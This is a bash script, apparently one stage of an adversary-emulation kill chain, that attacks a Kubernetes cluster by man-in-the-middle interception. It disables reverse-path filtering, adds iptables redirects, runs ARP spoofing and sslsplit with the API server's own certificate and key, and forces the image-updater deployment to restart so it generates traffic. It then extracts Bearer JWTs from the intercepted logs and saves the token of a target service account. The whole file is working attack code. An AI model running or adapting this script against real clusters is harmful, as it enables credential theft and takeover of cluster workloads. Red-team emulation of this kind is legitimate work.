#!/usr/bin/env bash
set -euo pipefail

if [ -f "${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh" ]; then
  source "${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/require-tools.sh"
else
  require_tools() {
    local missing=()
    local tool
    for tool in "$@"; do
      command -v "$tool" >/dev/null 2>&1 || missing+=("$tool")
    done
    if (( ${#missing[@]} > 0 )); then
      echo "Missing required tools: ${missing[*]}" >&2
      exit 1
    fi
  }
fi

UPSTREAM_HOST="$CONTROL_PLANE_NODE"
UPSTREAM_PORT="$CONTROL_PLANE_PORT"
IFACE="eth0"
LOGDIR="$DATA_PATH/KC5/logdir"
PIDFILE="$DATA_PATH/KC5/arp_pids"
HELPER_PIDFILE="$DATA_PATH/KC5/pids"

LEAF_PEM="$DATA_PATH/KC5/inbound.pem"
SYSCTL_BEFORE="$DATA_PATH/KC5/sysctl.before"
SEEN_SUBJECTS="$DATA_PATH/KC5/subjects_seen.txt"
TOKEN_RE='[Bb]earer[[:space:]]+([A-Za-z0-9._~+/=\-]+)'
UPDATER_NAMESPACE="${UPDATER_NAMESPACE:-${LOG_NS:-mem}}"
UPDATER_DEPLOYMENT="${UPDATER_DEPLOYMENT:-image-updater}"
UPDATER_SERVICE_ACCOUNT="${UPDATER_SERVICE_ACCOUNT:-updater-sa}"
REQUIRED_SUBSTR="system:serviceaccount:${UPDATER_NAMESPACE}:${UPDATER_SERVICE_ACCOUNT}"
OUTPUT_PATH="$DATA_PATH/KC5/found_token"
IPAPI="$(getent hosts "$UPSTREAM_HOST" | awk '{print $1; exit}')"
IPAPI="${IPAPI:-$(dig +short "$UPSTREAM_HOST" A | awk 'NF {print; exit}')}"
KUBERNETES_SERVICE_IP="${KUBERNETES_SERVICE_HOST:-${KUBERNETES_SERVICE_IP:-10.96.0.1}}"
KUBERNETES_SERVICE_PORT="${KUBERNETES_SERVICE_PORT:-443}"
SERVICE_LISTEN_PORT="${MITM_SERVICE_LISTEN_PORT:-8443}"
TOKEN_TIMEOUT="${MITM_TOKEN_TIMEOUT:-480}"

cleanup() {
  local rc=$?
  trap - EXIT INT TERM
  echo "[*] Cleanup..."
  ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/remove-pids.sh "$PIDFILE" || echo "[WARN] remove-pids failed" >&2
  ${ATTACKER_LIB_DIR:-/opt/attacker-lib}/common/remove-pids.sh "$HELPER_PIDFILE" || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -p tcp -d "$KUBERNETES_SERVICE_IP" --dport "$KUBERNETES_SERVICE_PORT" -j REDIRECT --to-ports "$SERVICE_LISTEN_PORT" 2>/dev/null || true
  [[ -n "${SSLPID:-}" ]] && kill "$SSLPID" 2>/dev/null || true
  if [[ -s "$SYSCTL_BEFORE" ]]; then
    while IFS='=' read -r key value; do
      [[ -n "$key" && -n "$value" ]] || continue
      sysctl -w "$key=$value" >/dev/null 2>&1 || true
    done < "$SYSCTL_BEFORE"
  fi
  ip neigh flush all >/dev/null 2>&1 || true
  exit "$rc"
}
trap cleanup EXIT INT TERM

require_tools awk base64 dig getent ip iptables jq sslsplit sysctl
if [[ -z "$IPAPI" ]]; then
  echo "Cannot resolve API server host: $UPSTREAM_HOST" >&2
  exit 1
fi

mkdir -p "$LOGDIR" "$(dirname "$PIDFILE")" "$(dirname "$HELPER_PIDFILE")"
: > "$SEEN_SUBJECTS"
echo "[*] Looking for token subject containing: ${REQUIRED_SUBSTR}"
echo "[*] API server endpoint: ${IPAPI}:${UPSTREAM_PORT}"

printf 'net.ipv4.conf.all.rp_filter=%s\n' "$(sysctl -n net.ipv4.conf.all.rp_filter 2>/dev/null || echo 1)" > "$SYSCTL_BEFORE"
printf 'net.ipv4.conf.%s.rp_filter=%s\n' "$IFACE" "$(sysctl -n "net.ipv4.conf.$IFACE.rp_filter" 2>/dev/null || echo 1)" >> "$SYSCTL_BEFORE"
printf 'net.ipv4.ip_forward=%s\n' "$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo 0)" >> "$SYSCTL_BEFORE"

sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null
sysctl -w net.ipv4.conf."$IFACE".rp_filter=0 >/dev/null
sysctl -w net.ipv4.ip_forward=1 >/dev/null

if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null; then
  iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT"
fi
if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$KUBERNETES_SERVICE_IP" --dport "$KUBERNETES_SERVICE_PORT" -j REDIRECT --to-ports "$SERVICE_LISTEN_PORT" 2>/dev/null; then
  iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$KUBERNETES_SERVICE_IP" --dport "$KUBERNETES_SERVICE_PORT" -j REDIRECT --to-ports "$SERVICE_LISTEN_PORT"
fi

if [[ ! -s /apiserver/apiserver.crt || ! -s /apiserver/apiserver.key ]]; then
  echo "Missing API server certificate/key in /apiserver" >&2
  exit 1
fi

/opt/caldera/KC2/nmap-enum.sh "$DATA_PATH/KC5"
/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "/tmp/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" "$PIDFILE"

cat /apiserver/apiserver.crt /apiserver/apiserver.key > "$LEAF_PEM"

nohup sslsplit \
  -A "$LEAF_PEM" \
  -P \
  -S "$LOGDIR" \
  -M "$DATA_PATH/KC5/sslkeys.log" \
  -l "$DATA_PATH/KC5/connect.log" \
  -D \
  ssl 0.0.0.0 "$UPSTREAM_PORT" "$IPAPI" "$UPSTREAM_PORT" \
  ssl 0.0.0.0 "$SERVICE_LISTEN_PORT" "$IPAPI" "$UPSTREAM_PORT" \
  >"$DATA_PATH/KC5/sslsplit.stdout.log" 2>"$DATA_PATH/KC5/sslsplit.stderr.log" &
SSLPID=$!
printf '%s\n' "$SSLPID" >> "$HELPER_PIDFILE"
sleep 2
if ! kill -0 "$SSLPID" >/dev/null 2>&1; then
  echo "sslsplit failed to start; see $DATA_PATH/KC5/sslsplit.stderr.log" >&2
  exit 1
fi

record_subject() {
  local sub="$1"
  [[ -n "$sub" ]] || return 0
  grep -Fxq "$sub" "$SEEN_SUBJECTS" 2>/dev/null || printf '%s\n' "$sub" >> "$SEEN_SUBJECTS"
}

run_kubectl_quietly() {
  if command -v timeout >/dev/null 2>&1; then
    timeout 25 kubectl "$@" >/dev/null 2>&1
  else
    kubectl "$@" >/dev/null 2>&1
  fi
}

kick_updater_traffic() {
  [[ "${MITM_KICK_IMAGE_UPDATER:-true}" == "false" ]] && return 0
  command -v kubectl >/dev/null 2>&1 || return 0

  if ! run_kubectl_quietly -n "$UPDATER_NAMESPACE" get "deployment/$UPDATER_DEPLOYMENT"; then
    echo "[*] image-updater deployment not reachable; waiting for existing API traffic"
    return 0
  fi

  if run_kubectl_quietly -n "$UPDATER_NAMESPACE" rollout restart "deployment/$UPDATER_DEPLOYMENT"; then
    echo "[*] Restarted ${UPDATER_NAMESPACE}/${UPDATER_DEPLOYMENT} to generate updater API traffic"
  else
    echo "[*] Could not restart ${UPDATER_NAMESPACE}/${UPDATER_DEPLOYMENT}; waiting for existing API traffic"
  fi
}

kick_updater_traffic

check_log_file() {
  local f="$1"
  local auth_line tok payload payload_json sub

  # 1) takes Authorization header (case-insensitive)
  auth_line="$(awk 'tolower($1)=="authorization:" {for(i=2;i<=NF;i++) printf "%s ", $i; print ""; exit}' "$f" 2>/dev/null || true)"
  [[ -z "$auth_line" ]] && return 1

  # 2) takes only token (remove "Bearer ")
  tok="$(printf '%s' "$auth_line" | grep -Eo "$TOKEN_RE" | sed -E 's/^[Bb]earer[[:space:]]+//; s/[[:space:]]+$//; q' || true)"
  [[ -z "$tok" ]] && return 1

  # 3) decodes payload (base64url -> json)
  IFS='.' read -r _ payload _ <<< "$tok"
  payload_json="$(printf '%s' "$payload" \
    | tr '_-' '/+' \
    | awk '{l=length($0)%4; if(l==2){print $0"=="} else if(l==3){print $0"="} else if(l==0){print $0} else {print $0}}' \
    | base64 -d 2>/dev/null || true)"
  [[ -z "$payload_json" ]] && return 1

  sub="$(echo "$payload_json" | jq -r '.sub // empty' 2>/dev/null || true)"
  record_subject "$sub"

  # 4) verify string in JSON (or on .sub)
  if echo "$payload_json" | grep -q -- "$REQUIRED_SUBSTR"; then
    printf '%s\n' "$tok" > "$OUTPUT_PATH"
    echo "[*] Token saved (match on JSON) -> $OUTPUT_PATH"
    return 0
  fi

  if [[ -n "$sub" && "$sub" == *"$REQUIRED_SUBSTR"* ]]; then
    printf '%s\n' "$tok" > "$OUTPUT_PATH"
    echo "[*] Token saved (match on .sub) -> $OUTPUT_PATH"
    return 0
  fi

  return 1
}

deadline=$((SECONDS + TOKEN_TIMEOUT))
while (( SECONDS < deadline )); do
  while IFS= read -r -d '' f; do
    if check_log_file "$f"; then
      exit 0
    fi
  done < <(find "$LOGDIR" -type f -name '*.log' -print0 2>/dev/null)
  sleep 1
done

echo "Token not found in $LOGDIR after ${TOKEN_TIMEOUT}s" >&2
if [[ -s "$SEEN_SUBJECTS" ]]; then
  echo "Subjects seen during MITM:" >&2
  sed 's/^/  - /' "$SEEN_SUBJECTS" >&2
fi
exit 1
